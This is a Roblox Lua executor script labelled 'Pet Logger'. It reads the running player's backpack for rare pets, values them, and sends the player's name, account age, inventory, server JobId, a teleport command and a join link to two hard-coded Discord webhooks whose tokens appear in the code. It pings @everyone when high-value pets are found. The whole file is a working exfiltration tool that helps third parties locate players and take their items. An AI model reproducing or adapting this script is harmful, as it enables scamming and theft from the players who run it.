local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- WEBHOOKS
local WEBHOOK_PRIORITY = "https://discord.com/api/webhooks/1410626814857973831/O4uWK0swu6aCG8HFTKa_3cncOA2liwK38aeAr-8fwPU7IDwASPHUg6jy-XLOanMWXzhU"
local WEBHOOK_NORMAL   = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"

-- HTTP request function
local req = http_request or request or (syn and syn.request) or (krnl and krnl.request)
if not req then return warn("âŒ Your executor does not support HTTP requests.") end

-- SERVER COLOR FUNCTION
local function getServerStatus()
    local totalPlayers = #Players:GetPlayers()
    local serverColor = totalPlayers == 5 and "ðŸŸ¥" or totalPlayers >= 3 and "ðŸŸ¨" or "ðŸŸ©"
    return string.format("%d/5 %s", totalPlayers, serverColor)
end

-- PRIORITY PETS & VALUES
local PRIORITY = {
    ["Raccoon"]="ðŸ¦", ["Dragonfly"]="ðŸ‰", ["Mimic Octopus"]="ðŸ™", ["Red Fox"]="ðŸ¦Š",
    ["Disco Bee"]="ðŸŽµðŸ", ["Queen Bee"]="ðŸ‘‘ðŸ", ["Lobster Thermidor"]="ðŸ¦ž",
    ["Golden Goose"]="ðŸ¥‡ðŸ¦¢", ["Kitsune"]="ðŸŒ¸", ["Corrupted Kitsune"]="ðŸ¦ ",
    ["Fennec Fox"]="ðŸº", ["T-Rex"]="ðŸ¦–"
}

local PRIORITY_VALUES = {
    ["Raccoon"]=250, ["Dragonfly"]=50, ["Mimic Octopus"]=30, ["Red Fox"]=10,
    ["Disco Bee"]=200, ["Queen Bee"]=20, ["Lobster Thermidor"]=30,
    ["Golden Goose"]=15, ["Kitsune"]=550, ["Corrupted Kitsune"]=10,
    ["Fennec Fox"]=100, ["T-Rex"]=35
}

-- ALL PETS
local PETS = { "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
    "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
    "Monkey","Flamingo","Toucan","Sea Turtle","Orangutan","Seal","Honey Bee","Wasp","Cow",
    "Silver Monkey","Sea Otter","Turtle","Polar Bear","Grey Mouse","Mole","Frog","Panda",
    "Blood Kiwi","Blood Hedgehog","Moon Cat","Petal Bee","Tarantula Hawk","Moth","Ostrich",
    "Peacock","Capybara","Scarlet Macaw","Meerkat","Sand Snake","Bald Eagle","Raptor",
    "Triceratops","Pterodactyl","Stegosaurus","Parasaurolophus","Iguanodon","Pachycephalosaurus",
    "Tanuki","Tanchozuru","Kodama","Corrupted Kodama","Sushi Bear","Hotdog Daschund","Seedling",
    "Snail","Giant Ant","Caterpillar","Brown Mouse","Squirrel","Praying Mantis","Echo Frog",
    "Chicken Zombie","Night Owl","Red Giant Ant","Cooked Owl","Butterfly","Mimic Octopus",
    "Axolotl","Hyacinth Macaw","Hamster","Brontosaurus","Dilophosaurus","Ankylosaurus","Owl",
    "Koi","Kappa","Raiju","Spaghetti Sloth","Mochi Mouse","Junkbot","Gorilla Chef","Golem",
    "Red Fox","Dragonfly","Disco Bee","Queen Bee","Lobster Thermidor","Golden Goose",
    "Kitsune","Corrupted Kitsune","Fennec Fox","T-Rex" }

-- Helper to check if a name is a pet
local PET_KEYWORDS = {}
for _, name in ipairs(PETS) do PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower() end
local function isPet(name)
    local lower = name:lower()
    for _, keyword in ipairs(PET_KEYWORDS) do
        if string.find(lower, keyword) then return true end
    end
    return false
end

local function getPriorityEmoji(name)
    for petName, emoji in pairs(PRIORITY) do
        if string.find(name:lower(), petName:lower()) then return emoji end
    end
    return nil
end

-- Collect pets from container
local function collectPets(container)
    if not container then return {},0,false end
    local items, hasPriorityPet = {}, false
    for _, obj in ipairs(container:GetChildren()) do
        if obj:IsA("Tool") and isPet(obj.Name) then
            table.insert(items,obj.Name)
            if getPriorityEmoji(obj.Name) then hasPriorityPet = true end
        end
    end

    local priorityStrong, priorityNormal, strong, normal = {}, {}, {}, {}
    local totalValue = 0

    for _, name in ipairs(items) do
        local weight = tonumber(string.match(name,"(%d+%.?%d*)%s*[Kk][Gg]?") or "0")
        local ageMatch = string.match(name,"%[Age%s*(%d+)%]") or ""
        local ageText = ageMatch ~= "" and "[Age "..ageMatch.."]" or ""
        local priorityEmoji = getPriorityEmoji(name)
        local baseValue = 0
        for petName, petValue in pairs(PRIORITY_VALUES) do
            if string.find(name:lower(), petName:lower()) then
                baseValue = petValue
                break
            end
        end
        local displayValue = baseValue
        local line = ""

        if priorityEmoji then
            if weight >= 30 then
                displayValue = displayValue + 3000
                line = "[ðŸ’ª] ["..priorityEmoji.."] - "..name.." ["..weight.." KG] "..ageText.." â†’ "..displayValue.."Â¢"
                table.insert(priorityStrong, {line=line,value=displayValue})
            else
                line = "["..priorityEmoji.."] - "..name.." ["..weight.." KG] "..ageText.." â†’ "..displayValue.."Â¢"
                table.insert(priorityNormal, {line=line,value=displayValue})
            end
        else
            if weight >= 15 then
                line = "ðŸ’ª - "..name.." ["..weight.." KG] "..ageText.." â†’ "..displayValue.."Â¢"
                table.insert(strong, {line=line,value=displayValue})
            else
                line = "ðŸ¶ - "..name.." ["..weight.." KG] "..ageText.." â†’ "..displayValue.."Â¢"
                table.insert(normal, {line=line,value=displayValue})
            end
        end

        totalValue = totalValue + displayValue
    end

    local function sortDesc(t) table.sort(t,function(a,b) return a.value>b.value end) end
    sortDesc(priorityStrong)
    sortDesc(priorityNormal)
    sortDesc(strong)
    sortDesc(normal)

    local formatted = {}
    for _,cat in ipairs({priorityStrong,priorityNormal,strong,normal}) do
        for _,entry in ipairs(cat) do table.insert(formatted,entry.line) end
    end

    return formatted,totalValue,hasPriorityPet
end

-- INITIAL COLLECTION
local backpack = player:WaitForChild("Backpack")
local backpackList, backpackValue, hasPriorityBackpack = collectPets(backpack)
local totalValue = backpackValue
local hasPriority = hasPriorityBackpack

-- Determine webhook and ping
local targetWebhook
local pingText = ""

if hasPriority then
    targetWebhook = WEBHOOK_PRIORITY
    pingText = "@everyone\n".."game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
else
    targetWebhook = WEBHOOK_NORMAL
    pingText = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
end

-- Build message with dynamic join URL
local function buildDescription()
    local serverURL = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
    local desc = "```Name: "..player.Name.."\nExecutor: Delta\nAccount Age: "..player.AccountAge.." days```\n"
    desc = desc.."ðŸ’° Kwarta nga nakuha\n```"..totalValue.."â‚±```\n"
    desc = desc.."ðŸŒ Server\n```"..getServerStatus().."```\n"
    desc = desc.."ðŸŽ’ Backpack\n```"..(#backpackList>0 and table.concat(backpackList,"\n") or "No pets").."```\n"
    desc = desc.."ðŸ”— Join with URL\n[**"..game.JobId.."**]("..serverURL..")"
    return desc
end

-- Send webhook
local payload = {
    content = pingText,
    username = "Pet Logger",
    embeds = {{
        title = "ðŸŒ‘Definitely Not DarkðŸŒ‘",
        description = buildDescription(),
        color = 0x00ff00
    }}
}

req({
    Url = targetWebhook,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode(payload)
})

print("âœ… Webhook sent!")
